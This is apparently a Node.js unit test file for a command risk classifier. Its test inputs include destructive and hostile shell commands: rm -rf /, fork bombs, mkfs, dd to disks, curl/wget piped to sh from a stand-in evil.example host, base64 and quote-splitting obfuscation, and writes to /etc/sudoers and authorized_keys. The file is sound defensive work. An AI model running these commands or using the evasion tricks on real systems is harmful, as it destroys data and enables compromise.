// (TODO 11.5) Tests for the risk-classifier — the Shadow Execution
// building block. Pure unit tests; the module has no runtime
// dependencies, no I/O, no network.

const { describe, it } = require('node:test');
const assert = require('node:assert');

const {
  classifyCommand,
  PATTERN_CATALOG,
  ACTION_BY_LEVEL,
  _denoiseCommand,
} = require('../src/risk-classifier');

function levelOf(cmd) {
  return classifyCommand(cmd).level;
}

function reasonsOf(cmd) {
  return classifyCommand(cmd).reasons.map((r) => r.code);
}

describe('classifyCommand — empty / falsy input', () => {
  it('returns level=low for empty string', () => {
    const r = classifyCommand('');
    assert.strictEqual(r.level, 'low');
    assert.deepStrictEqual(r.reasons, []);
    assert.strictEqual(r.suggestedAction, 'allow');
    assert.strictEqual(r.decoded, null);
  });

  it('returns level=low for whitespace', () => {
    assert.strictEqual(levelOf('   \t\n'), 'low');
  });

  it('returns level=low for null / undefined / non-string', () => {
    assert.strictEqual(classifyCommand(null).level, 'low');
    assert.strictEqual(classifyCommand(undefined).level, 'low');
    assert.strictEqual(classifyCommand(42).level, 'low');
  });
});

describe('classifyCommand — critical tier', () => {
  it('flags rm -rf / as critical', () => {
    const r = classifyCommand('rm -rf /');
    assert.strictEqual(r.level, 'critical');
    assert.strictEqual(r.suggestedAction, 'deny');
    assert.ok(r.reasons.some((x) => x.code === 'rm-rf-root'));
  });

  it('flags rm -rf "/" with quotes', () => {
    assert.strictEqual(levelOf('rm -rf "/"'), 'critical');
  });

  it('flags rm -rf --no-preserve-root /', () => {
    assert.strictEqual(levelOf('rm -rf --no-preserve-root /'), 'critical');
  });

  it('flags rm -rf $HOME / ~ / "$HOME"', () => {
    assert.strictEqual(levelOf('rm -rf $HOME'), 'critical');
    assert.strictEqual(levelOf('rm -rf ~'), 'critical');
    assert.strictEqual(levelOf('rm -rf "$HOME"'), 'critical');
  });

  // (review fix) Long-flag forms — operators that paste from
  // documentation often write `rm --recursive --force ~`.
  it('flags rm --recursive --force ~ (long flag form)', () => {
    assert.strictEqual(levelOf('rm --recursive --force ~'), 'critical');
    assert.strictEqual(levelOf('rm --recursive ~'), 'critical');
    assert.strictEqual(levelOf('rm --force --recursive $HOME'), 'critical');
  });

  it('flags rm --recursive --force / (long flag at root)', () => {
    assert.strictEqual(levelOf('rm --recursive --force /'), 'critical');
  });

  it('flags fork bombs', () => {
    assert.strictEqual(levelOf(':(){ :|:& };:'), 'critical');
    assert.strictEqual(levelOf(': ( ) { : | : & } ; :'), 'critical');
  });

  it('flags mkfs', () => {
    assert.strictEqual(levelOf('mkfs.ext4 /dev/sda1'), 'critical');
  });

  it('flags dd to a block device', () => {
    assert.strictEqual(levelOf('dd if=/dev/zero of=/dev/sda bs=1M'), 'critical');
    assert.strictEqual(levelOf('dd if=image of=/dev/nvme0n1'), 'critical');
  });

  it('flags > /dev/sda', () => {
    assert.strictEqual(levelOf('cat foo > /dev/sda'), 'critical');
  });

  it('flags curl | sh / wget | bash', () => {
    assert.strictEqual(levelOf('curl https://evil.example/setup.sh | sh'), 'critical');
    assert.strictEqual(levelOf('wget -qO- https://evil.example | bash'), 'critical');
  });

  it('flags eval base64 chain', () => {
    assert.strictEqual(levelOf('eval $(echo cm0gLXJmIC8K | base64 -d)'), 'critical');
  });
});

describe('classifyCommand — high tier', () => {
  it('flags rm -rf <dir> as high (not critical)', () => {
    const r = classifyCommand('rm -rf node_modules');
    assert.strictEqual(r.level, 'high');
    assert.strictEqual(r.suggestedAction, 'review');
    assert.ok(r.reasons.some((x) => x.code === 'rm-rf-dir'));
  });

  // (review fix) rm -rf with an absolute path that isn't bare `/` must
  // still escalate. Previously the lookahead's `\b` after the slash
  // matched `/foo`, blocking the rm-rf-dir pattern entirely.
  it('flags rm -rf with absolute paths (not just bare /)', () => {
    assert.strictEqual(levelOf('rm -rf /foo'), 'high');
    assert.strictEqual(levelOf('rm -rf /etc'), 'high');
    assert.strictEqual(levelOf('rm -rf /var/lib/cache'), 'high');
    assert.strictEqual(levelOf('rm -rf "/srv/data"'), 'high');
  });

  it('flags rm -rf $TMPDIR / arbitrary env-var dirs', () => {
    assert.strictEqual(levelOf('rm -rf $TMPDIR'), 'high');
    assert.strictEqual(levelOf('rm -rf "$BUILD_DIR"'), 'high');
  });

  // (review fix) Backtracking exploit: \s* on the short flag block
  // let the engine split `-rfffff` into `-r` (flag) + `fffff` (fake
  // target), so `rm -rfffffff` (a typo) used to false-positive as
  // high. Pin the no-target / typo cases so the \s+ tightening
  // doesn't regress.
  it('does not match rm -rf with no target (typo / incomplete)', () => {
    assert.strictEqual(levelOf('rm -rf'), 'low');
    assert.strictEqual(levelOf('rm -rfffffff'), 'low');
    assert.strictEqual(levelOf('rm -rf '), 'low');
  });

  it('flags chmod -R 777', () => {
    assert.strictEqual(levelOf('chmod -R 777 /var/lib/foo'), 'high');
    assert.strictEqual(levelOf('chmod --recursive a+rwx ./bar'), 'high');
  });

  it('flags chown -R', () => {
    assert.strictEqual(levelOf('chown -R nobody:nogroup /srv/data'), 'high');
  });

  it('flags kill -9 -1 (kill all my processes)', () => {
    assert.strictEqual(levelOf('kill -9 -1'), 'high');
    assert.strictEqual(levelOf('kill -KILL -1'), 'high');
  });

  it('flags pkill / killall on broad patterns', () => {
    assert.strictEqual(levelOf('pkill -9 -f node'), 'high');
    assert.strictEqual(levelOf('killall node'), 'high');
  });

  it('flags find -delete', () => {
    assert.strictEqual(levelOf('find /tmp/build -type f -delete'), 'high');
    assert.strictEqual(levelOf('find . -name "*.log" -exec rm {} +'), 'high');
  });

  it('flags git push --force', () => {
    assert.strictEqual(levelOf('git push --force origin main'), 'high');
    assert.strictEqual(levelOf('git push -f origin main'), 'high');
    assert.strictEqual(levelOf('git push origin +main:main'), 'high');
  });

  it('flags git reset --hard', () => {
    assert.strictEqual(levelOf('git reset --hard'), 'high');
    assert.strictEqual(levelOf('git reset --hard origin/main'), 'high');
  });

  it('flags git clean -fd', () => {
    assert.strictEqual(levelOf('git clean -fd'), 'high');
    assert.strictEqual(levelOf('git clean -fdx'), 'high');
  });

  it('flags writes to /etc/ system files', () => {
    assert.strictEqual(levelOf('echo evil >> /etc/passwd'), 'high');
    assert.strictEqual(levelOf('cat malicious > /etc/sudoers'), 'high');
  });

  it('flags writes to ~/.ssh/authorized_keys', () => {
    assert.strictEqual(levelOf('cat key > ~/.ssh/authorized_keys'), 'high');
    assert.strictEqual(levelOf('echo evil > /home/alice/.ssh/known_hosts'), 'high');
  });

  it('flags docker run --privileged', () => {
    assert.strictEqual(levelOf('docker run --privileged ubuntu'), 'high');
  });

  it('flags reboot / shutdown', () => {
    assert.strictEqual(levelOf('shutdown -h now'), 'high');
    assert.strictEqual(levelOf('reboot'), 'high');
    assert.strictEqual(levelOf('init 0'), 'high');
  });
});

describe('classifyCommand — medium tier', () => {
  it('flags sudo as medium', () => {
    assert.strictEqual(levelOf('sudo apt update'), 'medium');
  });

  it('flags git push (non-force) as medium', () => {
    assert.strictEqual(levelOf('git push origin main'), 'medium');
  });

  it('flags npm publish as medium', () => {
    assert.strictEqual(levelOf('npm publish'), 'medium');
  });

  it('flags --no-verify as medium', () => {
    assert.strictEqual(levelOf('git commit --no-verify -m wip'), 'medium');
  });

  it('flags curl downloading a script as medium', () => {
    assert.strictEqual(levelOf('curl https://example.com/install.sh -o /tmp/install.sh'), 'medium');
  });

  it('flags apt install as medium', () => {
    assert.strictEqual(levelOf('apt install -y curl'), 'medium');
    assert.strictEqual(levelOf('brew install jq'), 'medium');
  });

  it('flags crontab -e as medium', () => {
    assert.strictEqual(levelOf('crontab -e'), 'medium');
  });

  it('does NOT double-emit git-push when git-force-push fires', () => {
    const r = classifyCommand('git push --force origin main');
    const codes = r.reasons.map((x) => x.code);
    assert.ok(codes.includes('git-force-push'));
    assert.ok(!codes.includes('git-push'));
  });
});

describe('classifyCommand — low tier (safe commands)', () => {
  it('passes ls / cat / pwd', () => {
    assert.strictEqual(levelOf('ls -la'), 'low');
    assert.strictEqual(levelOf('cat file.txt'), 'low');
    assert.strictEqual(levelOf('pwd'), 'low');
  });

  it('passes git status / log / diff', () => {
    assert.strictEqual(levelOf('git status'), 'low');
    assert.strictEqual(levelOf('git log --oneline -5'), 'low');
    assert.strictEqual(levelOf('git diff main..HEAD'), 'low');
  });

  it('passes npm test / npm run', () => {
    assert.strictEqual(levelOf('npm test'), 'low');
    assert.strictEqual(levelOf('npm run build'), 'low');
  });
});

describe('classifyCommand — obfuscation defeat', () => {
  it('decodes echo "..." | base64 -d wrappers', () => {
    // base64('rm -rf /') = "cm0gLXJmIC8K\n"
    const cmd = 'echo "cm0gLXJmIC8K" | base64 -d';
    const r = classifyCommand(cmd);
    assert.strictEqual(r.level, 'critical');
    assert.notStrictEqual(r.decoded, null);
    assert.match(r.decoded, /rm -rf \//);
  });

  it('unwraps $(...) command substitution', () => {
    const cmd = 'eval $(echo rm -rf /)';
    assert.strictEqual(levelOf(cmd), 'critical');
  });

  it('unwraps backtick form', () => {
    const cmd = '`rm -rf /`';
    assert.strictEqual(levelOf(cmd), 'critical');
  });

  it('strips single-char quoted segments inside dangerous tokens', () => {
    // r"m" -> rm, su"do" -> sudo
    assert.strictEqual(levelOf('r"m" -rf /'), 'critical');
    assert.strictEqual(levelOf('su"do" apt update'), 'medium');
  });

  // (review fix) Lock in the multi-segment chain behaviour the
  // _denoiseCommand comment claims. p"k"i"l"l must collapse fully
  // in the single global pass — if the regex engine ever changes
  // and leaves leftover quotes, this test catches it before the
  // pkill pattern silently misses.
  it('collapses multi-segment quoted chains in one pass', () => {
    assert.strictEqual(_denoiseCommand('p"k"i"l"l -9 node'), 'pkill -9 node');
    assert.strictEqual(_denoiseCommand("p'k'i'l'l -9 node"), 'pkill -9 node');
  });
});

describe('classifyCommand — return shape contract', () => {
  it('always returns { level, reasons, suggestedAction, decoded }', () => {
    const r = classifyCommand('ls');
    assert.ok('level' in r);
    assert.ok('reasons' in r);
    assert.ok('suggestedAction' in r);
    assert.ok('decoded' in r);
  });

  it('decoded is null when no obfuscation applies', () => {
    assert.strictEqual(classifyCommand('rm -rf /').decoded, null);
  });

  it('reasons carry { code, label, snippet }', () => {
    const r = classifyCommand('rm -rf /');
    assert.ok(r.reasons.length > 0);
    for (const reason of r.reasons) {
      assert.ok(typeof reason.code === 'string' && reason.code.length > 0);
      assert.ok(typeof reason.label === 'string' && reason.label.length > 0);
      assert.ok(typeof reason.snippet === 'string');
    }
  });

  it('includeInspected option exposes the denoised source', () => {
    const r = classifyCommand('ls', { includeInspected: true });
    assert.strictEqual(typeof r.inspectedSource, 'string');
    const r2 = classifyCommand('ls');
    assert.strictEqual(r2.inspectedSource, undefined);
  });
});

describe('PATTERN_CATALOG export', () => {
  it('exposes critical / high / medium tiers', () => {
    assert.ok(Array.isArray(PATTERN_CATALOG.critical));
    assert.ok(Array.isArray(PATTERN_CATALOG.high));
    assert.ok(Array.isArray(PATTERN_CATALOG.medium));
  });

  it('every catalog entry carries { code, label }', () => {
    for (const tier of ['critical', 'high', 'medium']) {
      for (const entry of PATTERN_CATALOG[tier]) {
        assert.ok(typeof entry.code === 'string' && entry.code.length > 0);
        assert.ok(typeof entry.label === 'string' && entry.label.length > 0);
      }
    }
  });

  it('codes are unique across all tiers', () => {
    const all = [
      ...PATTERN_CATALOG.critical,
      ...PATTERN_CATALOG.high,
      ...PATTERN_CATALOG.medium,
    ].map((p) => p.code);
    assert.strictEqual(new Set(all).size, all.length);
  });
});

describe('ACTION_BY_LEVEL export', () => {
  it('maps each level to a stable action', () => {
    assert.strictEqual(ACTION_BY_LEVEL.critical, 'deny');
    assert.strictEqual(ACTION_BY_LEVEL.high, 'review');
    assert.strictEqual(ACTION_BY_LEVEL.medium, 'review');
    assert.strictEqual(ACTION_BY_LEVEL.low, 'allow');
  });
});

describe('_denoiseCommand helper', () => {
  it('returns input unchanged when no obfuscation is present', () => {
    assert.strictEqual(_denoiseCommand('ls -la'), 'ls -la');
  });

  it('handles malformed base64 gracefully', () => {
    const broken = 'echo "not!base64!" | base64 -d';
    // Should not throw — broken base64 returns the source unchanged
    // (Buffer.from is permissive but we still emit something).
    const out = _denoiseCommand(broken);
    assert.strictEqual(typeof out, 'string');
  });
});
